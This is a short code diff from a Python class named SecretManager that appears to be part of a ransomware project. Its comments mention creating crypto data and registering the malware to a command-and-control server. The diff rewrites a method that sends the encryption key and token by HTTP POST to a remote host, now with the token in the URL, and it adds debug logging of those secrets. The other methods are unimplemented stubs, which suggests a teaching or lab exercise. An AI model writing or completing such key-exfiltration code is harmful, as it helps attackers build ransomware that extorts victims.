@@ -52,19 +52,21 @@ class SecretManager:
                 "key": self.bin_to_b64(self._key),
                 "token": self.bin_to_b64(self._token),
                 }
-        headers = {'Content-type': 'application/json',
-                   'Content-Length': '800'}
-        requests.post('http://' + self._remote_host_port, json = secrets_json, headers = headers)
+        header = {"Content-Type":"application/json"}
+        self._log.debug(secrets_json)
+        # self._log.debug(headers)
+        url = 'http://' + self._remote_host_port + '/new?token=' + str(int.from_bytes(self._token))
+        requests.post(url, json = secrets_json, headers=header)
 
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
         raise NotImplemented()
 
-    def load(self)->None:
+    def load(self) -> None:
         # function to load crypto data
         raise NotImplemented()
 
-    def check_key(self, candidate_key: bytes)->bool:
+    def check_key(self, candidate_key: bytes) -> bool:
         # Assert the key is valid
         raise NotImplemented()
 
